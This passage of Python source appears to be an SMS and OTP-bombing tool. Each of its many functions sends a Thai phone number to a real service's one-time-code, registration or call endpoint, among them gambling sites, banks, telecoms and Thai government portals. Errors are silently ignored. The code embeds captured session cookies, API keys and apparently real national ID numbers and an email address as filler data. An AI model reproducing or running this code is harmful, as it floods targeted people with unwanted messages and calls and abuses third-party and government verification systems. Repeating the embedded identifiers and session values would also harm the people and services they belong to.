            response = requests.post("https://bacara888.com/api/otp/register",data={"applicant":phone,"serviceName":"gclub"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api75():
        try:
            response = requests.post("https://queenclub88.com/api/register/phone", data={"phone":phone})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api76():
        try:
            response = requests.post("https://api.cdfoi9.com/api/v1/index.php", data=f"module=%2Fusers%2FgetVerificationCode&mobile={phone}&merchantId=111&domainId=0&accessId=&accessToken=&walletIsAdmin=",headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","content-type": "application/x-www-form-urlencoded"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api77():
        try:
            response = requests.get(f"https://api.joox.com/web-fcgi-bin/web_account_manager?optype=5&os_type=2&country_code=66&phone_number=0{phone}&time=1641777424446&_=1641777424449&callback=axiosJsonpCallback2")
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api79():
        try:
            send = Session()
            send.headers.update({"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38","Content-Type" : "application/x-www-form-urlencoded","Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"})
            response = requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data=f"st.r.phone=+66{phone[1:]}")
            response = requests.post("https://ok.ru/dk?cmd=AnonymRegistrationAcceptCallUI&st.cmd=anonymRegistrationAcceptCallUI",data="st.r.fieldAcceptCallUIButton=Call")
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api80():
        try:
            response = requests.get(f"https://findclone.ru/register?phone=+66{phone[1:]}",headers={"X-Requested-With" : "XMLHttpRequest","User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api81():
        try:
            head = {"Host": "users.cars24.co.th","x_vehicle_type": "CAR","accept": "application/json, text/plain, */*","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","x_country": "TH","sec-ch-ua-platform": "Android","origin": "https://www.cars24.co.th","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://www.cars24.co.th/","cookie": "_ga=GA1.3.31251861.1643986646;_gaexp=GAX1.3.PDQKIJpORiqz3sQ-b-n6dg.19097.1!6d55AMaSQSeBR3ISG4OEXQ.19110.1;_fbp=fb.2.1643986648656.1241126413;_gid=GA1.3.1399625525.1644221421;_dc_gtm_UA-65843992-28=1;_gat_UA-65843992-28=1;_hjSessionUser_2738441=eyJpZCI6IjY4OGUyODNkLTgxYzYtNTY5YS04ODMxLTFmMDY4N2I1YmVhMSIsImNyZWF0ZWQiOjE2NDM5ODY2NDcxOTAsImV4aXN0aW5nIjp0cnVlfQ==;_hjSession_2738441=eyJpZCI6IjBjNWQ3MDYxLTVlMmUtNGI2My1iMWFjLWVkNmY0OTIzNDI4ZiIsImNyZWF0ZWQiOjE2NDQyMjE0MjU4MDEsImluU2FtcGxlIjpmYWxzZX0=;_hjAbsoluteSessionInProgress=1;cto_bundle=jGdn019OJTJGRDNwa052ajI1cjBrT0JkeXJEVkxSOWM3NzF5RkpkbHhma3VwZ3NsM3YzOGpISVBsUyUyRm9UJTJCRSUyQkY2dThHQVFQd0VnWXE1MyUyRldHbnQlMkIwOHFzcFN2UFVtb0hmVnI4aTdZYUcyUHBBVG0lMkZRMnRVQjh5N2l5UnNGOG02SXlOOTg0MVVLeUxlNHBKZXFFUmVuRWFsUEFlZyUzRCUzRA",}
            response = requests.get(f"https://users.cars24.co.th/oauth/consumer-app/otp/{phone}?lang=th",headers=head)
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}") 
        except:pass
    def api82():
        try:
            head = {
            "Host": "topping.truemoveh.com",
            "Connection": "keep-alive",
            "Content-Length": "24",
            "Accept": "application/json, text/plain, */*",
            "sec-ch-ua-mobile": "?1",
            "User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
            "sec-ch-ua-platform": "Android",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://topping.truemoveh.com",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://topping.truemoveh.com/otp",
            "Cookie": "_ga=GA1.2.646938249.1643292159; _gcl_au=1.1.1962533520.1643292160; wisepops=%7B%22csd%22%3A1%2C%22popups%22%3A%7B%7D%2C%22sub%22%3A0%2C%22ucrn%22%3A19%2C%22cid%22%3A%2237257%22%2C%22v%22%3A4%2C%22bandit%22%3A%7B%22recos%22%3A%7B%7D%7D%7D; wisepops_props=%7B%22userType%22%3A%22non-true%22%7D; wisepops_visits=%5B%222022-01-27T14%3A02%3A42.216Z%22%5D; _fbp=fb.1.1643292163988.1723328884; _gcl_aw=GCL.1643381322.Cj0KCQiAosmPBhCPARIsAHOen-PPH1FzRFxTuntoTuNqoTo_W_kXScnpa-O5LAHsNi9gwADKwqr3HVpkaArIxEALw_wcB; _gcl_dc=GCL.1643381322.Cj0KCQiAosmPBhCPARIsAHOen-PPH1FzRFxTuntoTuNqoTo_W_kXScnpa-O5LAHsNi9gwADKwqr3HVpkaArIxEALw_wcB; _gac_UA-41231050-25=1.1643381323.Cj0KCQiAosmPBhCPARIsAHOen-PPH1FzRFxTuntoTuNqoTo_W_kXScnpa-O5LAHsNi9gwADKwqr3HVpkaArIxEALw_wcB; _gid=GA1.2.1726755834.1644230115; _gac_UA-34289891-14=1.1644230115.CjwKCAiAo4OQBhBBEiwA5KWu_5IA6uyAww4qPkUpdnVG03rFkKWzUVj4P_bcVEr3kjPLpPog7kH6nhoC5RoQAvD_BwE; ci_session=4hcp73rk1bsjivibj89b4336ahvsvdvs; AWSELB=87C963610CC5C30592B0F71CAEE836AADF65AFF786EC6752FFEDD2F1D1C0FBDC203EAD70C1274E09516CD583555319DCD29177760627A05233E168844AF84003E3E7363AB6028C9955ED4BC3A7CA6104710AD5F1F8; _gat=1; _gat_UA-41231050-25=1; wisepops_session=%7B%22arrivalOnSite%22%3A%222022-02-07T10%3A36%3A21.196Z%22%2C%22mtime%22%3A1644230181933%2C%22pageviews%22%3A1%2C%22popups%22%3A%7B%7D%2C%22bars%22%3A%7B%7D%2C%22countdowns%22%3A%7B%7D%2C%22src%22%3Anull%2C%22utm%22%3A%7B%7D%2C%22testIp%22%3Anull%7D"
            }
            response = requests.post("https://topping.truemoveh.com/api/get_request_otp",headers=head,data=f"mobile_number={phone}")
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

            # KFC
    def api83():
        try:
            head = {
            "Host": "www.ktc.co.th",
            "content-length": "28",
            "cache-control": "max-age=0",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "Android",
            "origin": "https://www.ktc.co.th",
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "sec-fetch-site": "same-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://www.ktc.co.th/account/index?register/verifyRegister",
            "cookie": "JSESSIONID=3A62A799BAB04F328EFC0EFDDB1C8AB8;AWSALB=3t/R34LVLC8K/EJdau1RE2njtRGCDl/NdTytp4wMw6KTTT9mYuI51B3x7HV4QjkplatwwJbHxgtUn27szWm/a2yUTQRy/0Ty1adoD+AMx4G7ZcXITdceLZ8agqLV;AWSALBCORS=3t/R34LVLC8K/EJdau1RE2njtRGCDl/NdTytp4wMw6KTTT9mYuI51B3x7HV4QjkplatwwJbHxgtUn27szWm/a2yUTQRy/0Ty1adoD+AMx4G7ZcXITdceLZ8agqLV"
            }
            response = requests.post("https://www.ktc.co.th/account/index?register/doVerifyNonMemberPhoneNo",headers=head,data=f"telNo={phone}&identity=1949900138953&registerService=2&isReEnroll=false&sign=SHA1withRSA%7CWTgqKrxW6GoFvCmEP8V1DjmPpN0Y7HSTqpA%2FHI45zPMcKE%2Bn%2FvvTTHZ%2FCqfFFinErjZ%2Bx5phAcasLd5k6CQuGGi%2B5xfJLuLdeO3btBubAZkwYSpDkpf08ai9%2BgK0sfQMYSwAlg0COEr%2B6QmuxrLtag3RffBA5KkRXK8aQizEwS8%3D")
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    # SME-GP
    def api84():
        try:
            response = requests.post("https://api.thaisme.one/smegp/register/request-otp",json={"MOBILE":phone})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

        # droprich
    def api85():
        try:
            response = requests.post("https://app.droprich.co/agent/registergetsmsotp",data=f"phonenumber={phone}",headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

            # OTP
    def api86():
        try:
            head = {
            "Host": "gateway-sport.autoplay.cloud",
            "content-length": "34",
            "accept": "application/json",
            "content-type": "application/json",
            "sec-ch-ua-mobile": "?1",
            "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
            "sec-ch-ua-platform": "Android",
            "origin": "https://sport.autoplay.cloud",
            "sec-fetch-site": "same-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://sport.autoplay.cloud/"
            }
            response = requests.post("https://gateway-sport.autoplay.cloud/iamrobot/frontend/user/send-otp",headers=head,json={"tel":phone,"prefix":"G8"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def api87():
        try:
            head = {
            "Host": "ufa108.ufabetcash.com",
            "content-length": "185",
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "x-requested-with": "XMLHttpRequest",
            "sec-ch-ua-mobile": "?1",
            "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
            "sec-ch-ua-platform": "Android",
            "origin": "https://ufa108.ufabetcash.com",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://ufa108.ufabetcash.com/v2/register.php",
            "cookie": "PHPSESSID=c12279b108845aaf9da743df3b2087ab"
            }
            response = requests.post("https://ufa108.ufabetcash.com/v2/api/",headers=head,data=f"cmd=request_form_register_detail_check&web_account_id=36&auto_bank_group_id=1&m_name=jssi&m_surname=akhhh&m_line=snsb1j&m_bank=4&m_account_number=8570156387&m_from=41&m_phone={phone}")
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def api88():
        try:
            response = requests.post("https://globalapi.pointspot.co/papi/oauth2/signinWithPhone", data={"phoneNumber": phone})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass


    def api89():
        try:
            response = requests.post("https://api.cashmarket-th.com/app/userinfo/send/smsCode", json={"baseParams":{"platformId":"android","deviceType":"h5","deviceIdKh":"20220118121149smyjjs57jxtqbwkuu74y0vd6p5yzhrmp86872f73364d46d3bf9446ddd583ef61ee8fafe504bab46ec267ca96a99281d6rreqhrlgsg4p3srgv1i5s4pp8u9la6gf1","termSysVersion":"5.1.1","termModel":"A37f","brand":"","termId":"null","appType":"6","appVersion":"2.0.0","pValue":"","position":{"lon":"null","lat":"null"},"bizType":"0000","appName":"Cash Market","packageName":"com.cashmarketth.h5","screenResolution":"720,1280"},"clientTypeFlag":"h5","token":"","phoneNumber":"","timestamp":"1642479101529","bizParams":{"phoneNum": phone,"code":"null","type":200,"channelCode":"hJ071"}})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def api90():
        try:
            head = {
            "Host": "shopgenix.com",
            "content-length": "37",
            "sec-ch-ua-mobile": "?1",
            "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "x-requested-with": "XMLHttpRequest",
            "sec-ch-ua-platform": "Android",
            "accept": "application/json, text/javascript, */*; q=0.01",
            "origin": "https://shopgenix.com",
            "referer": "https://shopgenix.com/app/5364874/",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty"
            }
            response = requests.post("https://shopgenix.com/api/sms/otp/",headers=head,data=f"mobile_country_id=1&mobile={phone}")
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

            # SME-GP
    def api91():
        try:
            response=requests.post("https://api.thaisme.one/smegp/register/request-otp",json={"MOBILE":phone})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

            #YOUROTP
    def api92():
        try:
            response=requests.post("https://apiv3.slot999ss.com/front/api/register/set/OTP",data=f"phone={phone}",headers={"content-type": "application/x-www-form-urlencoded;charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}") 
        except:pass

    def api94():
        try:
            response=requests.post("https://prettygaming168-api.auto888.cloud/api/v3/otp/send", data={"tel":phone,"otp_type":"register"},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","authorization": "Basic 755b4608e637d413d668502704d93e377f4f67b2d3d0f50e5644af3607f31ddb3174ecaf5b2c40c86f9efc32de1ee0bbf3e7a2b32cb055a3cb7068e1bb152844"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    #Zilingo
    def api95():
        try:
            head = {
            "Host": "id.zilingo.com",
            "content-length": "153",
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "x-requested-with": "XMLHttpRequest",
            "sec-ch-ua-mobile": "?1",
            "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
            "sec-ch-ua-platform": "Android",
            "origin": "https://id.zilingo.com",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://id.zilingo.com/login?redirectTo=%2Fth-th%2FWomen%2FClothing&zl_a_si=WCL&up_s=B2B_ASIA_MALL&zl_a_st=category&up_cd=v1_eyJjbGllbnRVc2VySWRlbnRpZmljYXRpb24iOnsiYW5vbnltb3VzVXNlcklkT3B0IjoiQUlENTUwMDY3MTIzMjA0NTY2MDkyIiwic2Vzc2lvbklkT3B0IjoiU0lENTUwMDY3MTIzMjA0NTY2MDkyIiwidXNlcklkT3B0IjpudWxsfSwic2NyZWVuT3B0Ijp7InNjcmVlblR5cGUiOiJDQVRFR09SWSIsInNjcmVlbklkIjoiV0NMIiwic2NvcGUiOm51bGx9LCJidXllclJlZ2lvbk9wdCI6IkIyQl9USEEiLCJsb2NhbGVDb2RlIjoidGgiLCJxdiI6eyJjbGllbnQiOiJXZWIiLCJzdWJDbGllbnQiOiJEZXNrdG9wV2ViIiwidmVyc2lvbiI6IjM1LjguNSJ9fQ%3D%3D&zl_a_pid=SCR-1644292893237-8b21bb69-4f78-4c0d-b828-9f8ff6950507&redirectTo=%2Fth-th%2FWomen%2FClothing&redirectTo=%2Fth-th%2FWomen%2FClothing",
            "cookie": "_ga=GA1.2.2069144459.1644337535;G_ENABLED_IDPS=google;PLAY_LANG=th;_gid=GA1.2.1262789134.1645627170;_gat_UA-73457576-9=1"
            }
            requests.post("https://id.zilingo.com/api/v1/userVerification/initiate?up_s=B2B_ASIA_MALL&up_cd=v1_eyJjbGllbnRVc2VySWRlbnRpZmljYXRpb24iOnsiYW5vbnltb3VzVXNlcklkT3B0IjoiQUlENTUwMDY3MTIzMjA0NTY2MDkyIiwic2Vzc2lvbklkT3B0IjoiU0lENTUwMDY3MTIzMjA0NTY2MDkyIiwidXNlcklkT3B0IjpudWxsfSwic2NyZWVuT3B0Ijp7InNjcmVlblR5cGUiOiJDQVRFR09SWSIsInNjcmVlbklkIjoiV0NMIiwic2NvcGUiOm51bGx9LCJidXllclJlZ2lvbk9wdCI6IkIyQl9USEEiLCJsb2NhbGVDb2RlIjoidGgiLCJxdiI6eyJjbGllbnQiOiJXZWIiLCJzdWJDbGllbnQiOiJEZXNrdG9wV2ViIiwidmVyc2lvbiI6IjM1LjguNSJ9fQ==",headers=head,json={"channelDetails":{"phoneNumber":f"+66{phone[1:]}","channelType":"SMS"},"source":"UNIFIED_LOGIN","action":"OTP_LOGIN","redirectTo":"/th-th/Women/Clothing"}).text
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
                #DGA
    def api96():
        try:
            head = {
            "Host": "accounts.egov.go.th",
            "content-length": "78",
            "sec-ch-ua-mobile": "?1",
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
            "content-type": "application/json; charset=UTF-8",
            "accept": "application/json, text/javascript, */*; q=0.01",
            "sec-ch-ua-platform": "Android",
            "origin": "https://accounts.egov.go.th",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://accounts.egov.go.th/Citizen/Account/RegisterAccount",
            "cookie": "__RequestVerificationToken=6H57gfKfbhVkpjPnm9FafDu2B8CAnuHPSEIom-T4em8-huQsr4DQN5BJlxxzMLGYqvG4EVEbBlOYokDKT8ooEB3vA0g1;ASP.NET_SessionId=x0tlpu21nmrnrasnjsgamivz;userInfo=TransactionId=f28ef0a2-23ff-4abd-b9e6-fdfc271298ea&CitizenId=1104200197909"
            }
            response=requests.post("https://accounts.egov.go.th/Citizen/Account/MobileRegisterJson",headers=head,json={"Mobile":f"{phone}","TransactionId":"f28ef0a2-23ff-4abd-b9e6-fdfc271298ea"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def api97():
        try:
            response=requests.post("https://tdhw.treasury.go.th/TD-Vote/api/otp/request",json={"ID_CARD":"1104200197909","TEL":f"{phone}","OTP_TYPE":"OTP_TEST"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass


    def api98():
        try:
            response=requests.post("https://user-api.learn.co.th/authentication/sendOTP",json={"mobileNumber": phone},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Host": "user-api.learn.co.th","content-length": "29","sec-ch-ua-mobile": "?1","content-type": "application/json;charset=UTF-8","accept": "application/json, text/plain, /","sec-ch-ua-platform": "Android","origin": "https://user.learn.co.th","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://user.learn.co.th/","x-api-key": "USER_API_KEY"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def api101():
        try:
            requests.post("https://api.ulive.youpik.com/api-base/sms/sendCode",data=f"phone={phone}&type=1",headers={"content-type":"application/x-www-form-urlencoded;charset=UTF-8","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def apicall():
        try:
            requests.post("https://www.theconcert.com/rest/request-otp",headers={"User-Agent": useragent},data={'mobile': f"{phone}", 'country_code': "TH", 'lang': "th", 'channel': "call", 'digit': '4'})
        except:pass
    def newa():
        try:
            requests.post('https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp', headers={"User-Agent": "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest","Cookie": "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1DJVRCMPpP8QtZsF5yDyw6ibCMf2HXs95LvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkLd3Q7qnZoSNBL8y9wge8Lt7grySdVLFhw9HB68dTSiOm1K04QhdrprI7EsTLWDHTgYmgyTQDuz63YjHsH5MUVanlfBISU1WXmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"}, data=f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER")
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def newa1():
        try:
            requests.post("https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code", headers={"User-Agent": useragent}, data={"phone": phone})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def newa2():
        try:
            requests.post("https://www.theconcert.com/rest/request-otp",headers={"User-Agent": useragent},data={'mobile': f"{phone}", 'country_code': "TH", 'lang': "th", 'channel': "call", 'digit': '4'})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def newa3():
        try:
            requests.post("https://shopgenix.com/api/sms/otp/", headers={
            "Host": "shopgenix.com",
            "content-length": "37",
            "sec-ch-ua-mobile": "?1",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "x-requested-with": "XMLHttpRequest",
            "sec-ch-ua-platform": "Android",
            "accept": "application/json, text/javascript, /; q=0.01",
            "origin": "https://shopgenix.com",
            "referer": "https://shopgenix.com/app/5364874/",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty"
            }, data=f"mobile_country_id=1&mobile={phone}")
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def newa6():
        try:
            requests.post("https://api.ulive.youpik.com/api-base/sms/sendCode",data=f"phone={phone}&type=1",headers={"content-type":"application/x-www-form-urlencoded;charset=UTF-8","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def newa7():
        try:
            requests.post("https://play.gkingbet.com/api/register/sms",json={"phone":phone,"agent_id":5,"country_code":"TH"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def newa8():
        try:
            requests.post("https://www.tgfone.com/signin/otp_chk_fast",headers= {
                "accept": "text/html, */*; q=0.01",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "x-requested-with": "XMLHttpRequest",
                "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
                "origin": "https://www.tgfone.com",
                "referer": "https://www.tgfone.com/login"
                },data=f"mobile={phone}&type_otp=7")
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def newa9():
        try:
            requests.post("https://api.thaisme.one/smegp/register/request-otp",headers={
                "accept": "application/json, text/plain, */*",
                "content-type": "application/json",
                "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
                "origin": "https://www.thaismegp.com",
                "referer": "https://www.thaismegp.com/"
                },json={"MOBILE":phone})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def newa10():
        try:   
            requests.post("https://api.sa.game/api/Account/SendRegisterVerificationSms",headers={
                "Accept": "application/json; charset=UTF-8",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
                "lobbyId": "23",
                "userDeviceTypeId": "6",
                "sec-ch-ua-platform": "Android",
                "Origin": "https://sa.game",
                "Sec-Fetch-Site": "same-site",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://sa.game/"
                },data={"countryId":7,"phoneNumber":f"{phone}"}) 
